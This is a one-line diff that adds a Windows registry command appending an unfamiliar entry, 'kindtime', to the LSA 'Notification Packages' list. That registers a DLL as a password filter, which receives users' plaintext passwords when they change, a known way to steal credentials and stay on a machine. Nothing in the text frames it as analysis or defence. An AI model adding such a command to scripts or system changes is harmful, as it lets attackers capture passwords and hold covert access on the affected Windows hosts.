@@ -1,0 +1,1 @@
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "rassfm\0scecli\0kindtime" /f
